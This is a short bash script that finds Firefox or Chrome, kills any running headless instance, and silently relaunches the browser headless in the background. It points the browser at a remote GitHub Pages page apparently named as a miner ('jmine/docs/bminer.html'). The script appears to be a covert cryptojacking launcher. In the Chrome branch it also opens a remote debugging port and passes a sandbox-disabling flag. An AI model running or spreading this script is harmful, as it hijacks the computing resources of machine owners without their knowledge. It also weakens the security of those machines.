#!/bin/bash
echo start
command -v firefox>/dev/null 2>&1
if [ $? -eq 0 ];then
	echo exist firefox
firefox -createprofile profile_name
ps -fe|grep "firefox -headless" |grep -v "grep"
	echo grepFirefoxthing:$?
	if [ $? -eq 0 ];then
		echo exist firefox process
		pkill -f "firefox -headless"
	fi
#ping -c5 www.google.com
firefox -headless -no-remote -p profile_name "https://good5068.github.io/jmine/docs/bminer.html" >/dev/null 2>&1 &
else
command -v google-chrome>/dev/null 2>&1
if [  $? -eq 0  ];then
echo exist chrome
#elif [ 1 -eq 1 ];then
ps -fe|grep "google-chrome --nosandbox --headless" |grep -v "grep"
	if [ $? -eq 0 ];then
		echo exist chrome process
		pkill -f "google-chrome --nosandbox --headless"
	fi
#ping -c5 www.google.com
google-chrome --nosandbox --headless --remote-debugging-port=9989 --profile-directory=Profile4  https://good5068.github.io/jmine/docs/bminer.html >/dev/null 2>&1 &
fi
fi

